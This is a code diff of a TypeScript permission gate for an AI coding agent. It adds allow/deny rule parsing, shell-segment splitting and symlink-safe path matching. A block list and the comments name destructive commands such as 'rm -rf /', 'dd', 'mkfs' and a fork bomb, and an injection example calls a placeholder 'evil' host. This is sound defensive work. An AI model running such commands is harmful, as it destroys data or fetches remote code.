@@ -6,9 +6,11 @@ import { realpathSync } from 'node:fs';
 
 import { execSync } from 'node:child_process';
 
-import type { PermissionDecision, ToolContext } from '../models/tool-types.js';
+import type { PermissionDecision, ToolContext, ParsedPermissionRule, PermissionRuleSet } from '../models/tool-types.js';
 
-// @kern-source: tool-permissions:9
+import { PERMISSION_DENIED_MESSAGE } from '../signals/tool-registry.js';
+
+// @kern-source: tool-permissions:10
 export interface PermissionRule {
   tool: string;
   behavior: 'allow'|'ask'|'deny';
@@ -16,16 +18,16 @@ export interface PermissionRule {
   reason?: string;
 }
 
-// @kern-source: tool-permissions:17
+// @kern-source: tool-permissions:18
 export const DANGEROUS_COMMANDS: string[] = ['rm -rf /', 'rm -rf ~', 'rm -rf *', 'dd if' + String.fromCharCode(61), 'mkfs.', '> /dev/sd', '> /dev/nv', 'chmod 777 /', ':(){:|:&}\\x3b:'];
 
-// @kern-source: tool-permissions:19
+// @kern-source: tool-permissions:20
 export const DANGEROUS_PREFIXES: string[] = ['sudo ', 'su ', 'doas '];
 
-// @kern-source: tool-permissions:21
+// @kern-source: tool-permissions:22
 export const SAFE_SHELL_WRAPPERS: string[] = ['timeout', 'time', 'nice', 'nohup', 'env', 'command'];
 
-// @kern-source: tool-permissions:23
+// @kern-source: tool-permissions:24
 export const READONLY_COMMANDS: Set<string> = new Set(['ls', 'cat', 'head', 'tail', 'less', 'more', 'wc', 'file', 'stat', 'pwd', 'echo', 'printf', 'date', 'which', 'whereis', 'type', 'find', 'grep', 'rg', 'ag', 'fd', 'fzf', 'git status', 'git log', 'git diff', 'git branch', 'git show', 'git blame', 'npm test', 'npm run test', 'npx vitest', 'npx tsc', 'node --version', 'npm --version', 'python --version', 'agon --help', 'agon config --help', 'agon config list', 'agon config get', 'tree', 'du', 'df']);
 
 // ── Module: ShellParsing ──
@@ -51,10 +53,10 @@ export function isReadOnlyCommand(command: string): boolean {
 }
 
 
-// @kern-source: tool-permissions:50
+// @kern-source: tool-permissions:51
 export const _gitDirtyCache: {files:Set<string>|null,cwd:string|null,expiry:number} = { files: null, cwd: null, expiry: 0 };
 
-// @kern-source: tool-permissions:52
+// @kern-source: tool-permissions:53
 export const GIT_DIRTY_CACHE_TTL: number = 2000  // 2 seconds;
 
 // ── Module: GitDirtyCache ──
@@ -94,18 +96,6 @@ export function isGitDirtyFile(filePath: string, cwd: string): boolean {
 
 // ── Module: PermissionChecks ──
 
-export function isSessionAllowed(command: string, ctx: ToolContext): boolean {
-  if (!ctx.sessionAllowList || ctx.sessionAllowList.length === 0) {
-    return false;
-  }
-  const sessionBase = command.trim().split(/\s+/)[0];
-  return ctx.sessionAllowList.some(ac => command.startsWith(ac) || sessionBase === ac);
-}
-
-export function checkBashPermission(command: string, ctx: ToolContext): PermissionDecision {
-  return isDangerousCommand(command) ? { behavior: 'deny', message: `Dangerous command blocked: ${command.slice(0, 50)}`, reason: 'dangerous_pattern' } : ((ctx.permissionMode === 'deny-all') ? { behavior: 'deny', message: 'All tool execution is denied' } : ((ctx.toolPermissions?.['Bash'] === 'allow') ? { behavior: 'allow' } : ((ctx.toolPermissions?.['Bash'] === 'deny') ? { behavior: 'deny', message: 'Bash denied in settings' } : (isReadOnlyCommand(command) ? { behavior: 'allow' } : (ctx.allowedCommands?.some(ac => command.startsWith(ac) || command.trim().split(/\s+/)[0] === ac) ? { behavior: 'allow' } : ((ctx.permissionMode === 'smart') ? ((isSessionAllowed(command, ctx) || ctx.source === 'orchestrator') ? { behavior: 'allow' } : { behavior: 'ask', message: `This command requires approval`, reason: 'bash_mutating' }) : ((ctx.permissionMode === 'auto') ? { behavior: 'allow' } : { behavior: 'ask', message: `This command requires approval`, reason: 'bash_mutating' })))))));
-}
-
 export function isPathUnderCwd(filePath: string, cwd: string): boolean {
   const resolved = isAbsolute(filePath) ? filePath : resolve(cwd, filePath);
   // Resolve symlinks to prevent traversal via symlinks
@@ -126,60 +116,245 @@ export function isPathUnderCwd(filePath: string, cwd: string): boolean {
   return !rel.startsWith('..');
 }
 
-export function checkFileReadPermission(filePath: string, ctx: ToolContext): PermissionDecision {
-  if (ctx.permissionMode === 'deny-all') {
-    return { behavior: 'deny', message: 'All tool execution is denied' };
+
+// @kern-source: tool-permissions:120
+export const _warnedMalformedRules: Set<string> = new Set();
+
+// ── Module: PermissionRules ──
+
+/**
+ * Parse a single Claude-Code-style rule string into {tool, command?, prefix}. Returns null for malformed input. e.g. 'Bash(npm test:*)' → {tool:'Bash', command:'npm test', prefix:true}; 'Edit' → {tool:'Edit', prefix:false}.
+ */
+export function parsePermissionRule(raw: unknown): ParsedPermissionRule|null {
+  if (typeof raw !== 'string') return null;
+  const trimmed = raw.trim();
+  if (trimmed.length === 0) return null;
+  // Tool(arg) form
+  const paren = trimmed.match(/^([A-Za-z][A-Za-z0-9_-]*)\((.*)\)$/);
+  if (paren) {
+    const tool = paren[1];
+    let arg = paren[2].trim();
+    if (arg.length === 0) {
+      // Tool() — empty arg, treat as tool-level
+      return { tool, prefix: false };
+    }
+    const prefix = arg.endsWith(':*');
+    if (prefix) arg = arg.slice(0, -2).trim();
+    if (arg.length === 0) {
+      // 'Bash(:*)' — degenerate; ignore
+      return null;
+    }
+    return { tool, command: arg, prefix };
   }
-  // Check per-tool permission from settings.json
-  if (ctx.toolPermissions?.['Read'] === 'deny') {
-    return { behavior: 'deny', message: 'Read denied in settings' };
+  // Bare tool form: 'Edit', 'Write', 'Read'
+  if (/^[A-Za-z][A-Za-z0-9_-]*$/.test(trimmed)) {
+    return { tool: trimmed, prefix: false };
   }
-  const readResolved = isAbsolute(filePath) ? filePath : resolve(ctx.cwd, filePath);
-  if (isPathUnderCwd(readResolved, ctx.cwd)) {
-    return { behavior: 'allow' };
-  }
-  if (ctx.toolPermissions?.['Read'] === 'ask') {
-    return { behavior: 'ask', message: `Read file outside workspace: ${readResolved}` };
-  }
-  if (ctx.permissionMode === 'auto') {
-    return { behavior: 'allow' };
-  }
-  return { behavior: 'ask', message: `Read file outside workspace: ${readResolved}` };
+  return null;
 }
 
-export function checkFileWritePermission(filePath: string, ctx: ToolContext): PermissionDecision {
-  if (ctx.permissionMode === 'deny-all') {
-    return { behavior: 'deny', message: 'All tool execution is denied' };
-  }
-  // Check per-tool permission from settings.json
-  if (ctx.toolPermissions?.['Edit']) {
-    const editPermission = ctx.toolPermissions['Edit'];
-    if (editPermission === 'deny') {
-      return { behavior: 'deny', message: 'Edit/Write denied in settings' };
+/**
+ * Normalize a raw permissions object into parsed allow/deny rule sets. Fail-safe: any malformed entry is skipped (warned once); a non-object input yields empty sets. Never throws.
+ */
+export function parsePermissionRuleSet(raw: unknown): PermissionRuleSet {
+  const empty: PermissionRuleSet = { allow: [], deny: [] };
+  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return empty;
+  const r = raw as Record<string, unknown>;
+  const parseList = (list: unknown, kind: string): ParsedPermissionRule[] => {
+    if (!Array.isArray(list)) {
+      if (list !== undefined) {
+        const key = `list:${kind}`;
+        if (!_warnedMalformedRules.has(key)) {
+          _warnedMalformedRules.add(key);
+          console.warn(`[agon] warning: permissions.${kind} is not an array — ignoring`);
+        }
+      }
+      return [];
     }
-    if (editPermission === 'ask') {
-      return { behavior: 'ask', message: `Edit requires approval: ${filePath}` };
+    const out: ParsedPermissionRule[] = [];
+    for (const entry of list) {
+      const parsed = parsePermissionRule(entry);
+      if (parsed) {
+        out.push(parsed);
+      } else {
+        const key = `rule:${String(entry)}`;
+        if (!_warnedMalformedRules.has(key)) {
+          _warnedMalformedRules.add(key);
+          console.warn(`[agon] warning: ignoring malformed permission rule: ${JSON.stringify(entry)}`);
+        }
+      }
+    }
+    return out;
+  };
+  return { allow: parseList(r.allow, 'allow'), deny: parseList(r.deny, 'deny') };
+}
+
+/**
+ * Does a parsed rule match a (tool, command) pair? Tool name match is case-sensitive (CC uses exact tool names). A rule with no command is tool-level (matches any invocation of that tool). A prefix rule (':*' suffix) matches when the command starts with the rule command on a word boundary; a non-prefix command rule matches exactly. Bash prefix 'npm test' matches 'npm test -- --filter x' but NOT 'npm testify'.
+ */
+export function ruleMatches(rule: ParsedPermissionRule, tool: string, command: string): boolean {
+  if (rule.tool !== tool) return false;
+  // Tool-level rule (no command) matches any invocation of the tool.
+  if (rule.command === undefined) return true;
+  const cmd = command.trim();
+  const ruleCmd = rule.command.trim();
+  if (ruleCmd.length === 0) return false;
+  if (rule.prefix) {
+    // Prefix match on a word boundary: 'npm test' matches 'npm test'
+    // and 'npm test -- x' but not 'npm testify'.
+    return cmd === ruleCmd || cmd.startsWith(ruleCmd + ' ');
+  }
+  return cmd === ruleCmd;
+}
+
+/**
+ * Evaluate parsed allow/deny rule sets against a (tool, command). Returns 'deny' if ANY deny rule matches (deny always wins), else 'allow' if any allow rule matches, else null (fall through to normal ask flow). NOTE: this is the simple single-token matcher; for the security-correct gate use evaluateToolRules, which adds Bash compound-segment splitting (F2) and file-path resolution (F3).
+ */
+export function evaluatePermissionRules(tool: string, command: string, rules: PermissionRuleSet): 'allow'|'deny'|null {
+  for (const rule of rules.deny) {
+    if (ruleMatches(rule, tool, command)) return 'deny';
+  }
+  for (const rule of rules.allow) {
+    if (ruleMatches(rule, tool, command)) return 'allow';
+  }
+  return null;
+}
+
+/**
+ * True if the command contains shell control operators or substitution that make single-token prefix matching unsafe: && || ; | & (background) $( ` > >> and newlines/CR. Single & and newline ARE separators — omitting them let `npm test & rm -rf /` ride a prefix allow rule (security re-review of 7090dff8). Used to decide whether Bash rule evaluation must split into segments.
+ */
+export function hasShellControl(command: string): boolean {
+  return /&&|\|\||;|\||\$\(|`|>>?|&|[\n\r]/.test(command);
+}
+
+/**
+ * True if the command contains an output redirection operator (> or >>). A redirection target lives outside the command token a prefix rule matches, so a redirecting command can never be auto-allowed by a prefix rule — it falls through to ask.
+ */
+export function hasRedirection(command: string): boolean {
+  return />>?/.test(command);
+}
+
+/**
+ * True if the command contains command substitution: $(...) or backticks. The substituted command is opaque to segment-splitting (it does not appear as a top-level segment), so a substituting command can never be auto-allowed by a prefix rule — it falls through to ask. e.g. `npm test $(curl evil)` must not ride a `Bash(npm test:*)` allow.
+ */
+export function hasSubstitution(command: string): boolean {
+  return /\$\(|`/.test(command);
+}
+
+/**
+ * Split a compound shell command into its executable segments on &&, ||, ; , | (pipe), single & (background), and newlines/CR. Command-substitution bodies $(...) / backticks are NOT executed-as-segments here; their PRESENCE alone forces ask via hasShellControl, so segment-level allow can never fire on a substituting command. Empty segments are dropped.
+ */
+export function splitShellSegments(command: string): string[] {
+  const sep = String.fromCharCode(59); // ';'
+  return command
+    .replace(/&&|\|\||&(?!&)|[\n\r]+/g, sep)
+    .split(new RegExp('\\|' + '|' + sep))
+    .map((s: string) => s.trim())
+    .filter((s: string) => s.length > 0);
+}
+
+/**
+ * F2-hardened Bash rule evaluation. For a simple (no control-op) command, behaves like evaluatePermissionRules. For a compound command: deny if ANY segment matches a deny rule; allow ONLY if EVERY segment matches an allow rule (and there is no redirection); otherwise null (ask). Command substitution / backticks force ask. This closes the `npm test && rm -rf /` auto-approve hole.
+ */
+export function evaluateBashRules(command: string, rules: PermissionRuleSet): 'allow'|'deny'|null {
+  const cmd = command.trim();
+  // Deny always wins — check the whole command AND every segment.
+  const segments = hasShellControl(cmd) ? splitShellSegments(cmd) : [cmd];
+  for (const seg of segments) {
+    for (const rule of rules.deny) {
+      if (ruleMatches(rule, 'Bash', seg)) return 'deny';
     }
   }
-  const writeResolved = isAbsolute(filePath) ? filePath : resolve(ctx.cwd, filePath);
-  // Block writing to sensitive files
-  const basename = writeResolved.split('/').pop() ?? '';
-  const sensitivePatterns = ['.env', 'credentials', 'secrets', '.pem', '.key', 'id_rsa'];
-  if (sensitivePatterns.some((pat: string) => basename.includes(pat))) {
-    return { behavior: 'ask', message: `Write to sensitive file: ${basename}` };
+  // Also honor a deny rule that matches the full compound string verbatim.
+  for (const rule of rules.deny) {
+    if (ruleMatches(rule, 'Bash', cmd)) return 'deny';
   }
-  if (isPathUnderCwd(writeResolved, ctx.cwd)) {
-    return { behavior: 'allow' };
-  }
-  // Smart mode: auto-approve git-dirty files, orchestrator edits
-  if (ctx.permissionMode === 'smart') {
-    if (isGitDirtyFile(writeResolved, ctx.cwd)) {
-      return { behavior: 'allow' };
+  // Allow only when the command is simple (or every segment is allowed) AND
+  // there is no redirection (the redirect target is unguarded by a prefix).
+  if (!hasShellControl(cmd)) {
+    for (const rule of rules.allow) {
+      if (ruleMatches(rule, 'Bash', cmd)) return 'allow';
     }
-    if (ctx.source === 'orchestrator') {
-      return { behavior: 'allow' };
-    }
-    return { behavior: 'ask', message: `Write to new file requires approval: ${writeResolved}` };
+    return null;
   }
-  return { behavior: 'ask', message: `Write file outside workspace: ${writeResolved}` };
+  // Redirection target and substitution body are unguarded by a prefix
+  // rule — never auto-allow them; fall through to ask.
+  if (hasRedirection(cmd) || hasSubstitution(cmd) || segments.length === 0) return null;
+  const everyAllowed = segments.every((seg: string) =>
+    rules.allow.some((rule) => ruleMatches(rule, 'Bash', seg)));
+  return everyAllowed ? 'allow' : null;
+}
+
+/**
+ * Resolve a tool file_path to an absolute, symlink-canonical path for rule matching. Absolute paths are kept; relative paths resolve against cwd. realpathSync canonicalizes existing paths; when the file does not exist yet, the longest existing ancestor is realpath'd and the remaining tail re-appended (so ../ escapes and symlinked parents are still resolved). Never throws.
+ */
+export function resolveRulePath(filePath: string, cwd: string): string {
+  try {
+    const abs = isAbsolute(filePath) ? filePath : resolve(cwd, filePath);
+    try {
+      return realpathSync(abs);
+    } catch {
+      // File doesn't exist — realpath the longest existing ancestor, using
+      // path.relative to split off the non-existent tail (robust at root,
+      // where there is no extra '/' separator between parent and basename).
+      let dir = abs;
+      for (let i = 0; i < 4096; i++) {
+        const parent = resolve(dir, '..');
+        if (parent === dir) break; // reached root and root is unreadable
+        try {
+          const realParent = realpathSync(parent);
+          const tail = relative(parent, abs);
+          return tail ? resolve(realParent, tail) : realParent;
+        } catch {
+          dir = parent;
+        }
+      }
+      return abs;
+    }
+  } catch {
+    return filePath;
+  }
+}
+
+/**
+ * Does a parsed file-tool rule match a resolved absolute path? Tool name must match. A command-less rule (bare `Edit`) is tool-level → matches any path. The rule path is itself resolved against cwd AND symlink-canonicalized the same way as the target (so `Edit(/etc:*)` matches `/etc/passwd` even though /etc → /private/etc on macOS). A match is exact equality or, for a ':*' prefix rule, the target sitting under the rule path on a '/'-segment boundary (so `Edit(/etc:*)` matches `/etc/passwd` but not `/etcother`). An exact (non-prefix) path rule matches only that exact file.
+ */
+export function pathRuleMatches(rule: ParsedPermissionRule, tool: string, resolvedPath: string, cwd: string): boolean {
+  if (rule.tool !== tool) return false;
+  if (rule.command === undefined) return true;
+  const rulePathRaw = rule.command.trim();
+  if (rulePathRaw.length === 0) return false;
+  // Canonicalize the rule path the SAME way as the target path so symlinked
+  // ancestors (e.g. /etc → /private/etc) compare equal on both sides.
+  const ruleAbs = resolveRulePath(rulePathRaw, cwd);
+  if (resolvedPath === ruleAbs) return true;
+  if (rule.prefix) {
+    return resolvedPath.startsWith(ruleAbs.endsWith('/') ? ruleAbs : ruleAbs + '/');
+  }
+  return false;
+}
+
+/**
+ * F3-hardened evaluation for file tools (Edit/Write/Read). Resolves the path (absolute + realpath, ../ and symlink safe) then matches on '/'-segment boundaries. deny wins. A bare tool rule (Edit/Write/Read) still matches any invocation.
+ */
+export function evaluateFilePathRules(tool: string, filePath: string, cwd: string, rules: PermissionRuleSet): 'allow'|'deny'|null {
+  const resolved = resolveRulePath(filePath, cwd);
+  for (const rule of rules.deny) {
+    if (pathRuleMatches(rule, tool, resolved, cwd)) return 'deny';
+  }
+  for (const rule of rules.allow) {
+    if (pathRuleMatches(rule, tool, resolved, cwd)) return 'allow';
+  }
+  return null;
+}
+
+/**
+ * The security-correct gate consulted by every approval seam. Dispatches Bash (arg = the command) to evaluateBashRules (F2 compound splitting) and the file tools Edit/Write/Read (arg = the file_path) to evaluateFilePathRules (F3 path resolution). Any other tool uses the simple single-token matcher. deny ALWAYS wins; allow auto-approves; null falls through to the normal ask flow.
+ */
+export function evaluateToolRules(tool: string, arg: string, cwd: string, rules: PermissionRuleSet): 'allow'|'deny'|null {
+  if (tool === 'Bash') return evaluateBashRules(arg, rules);
+  if (tool === 'Edit' || tool === 'Write' || tool === 'Read') {
+    return evaluateFilePathRules(tool, arg, cwd, rules);
+  }
+  return evaluatePermissionRules(tool, arg, rules);
 }
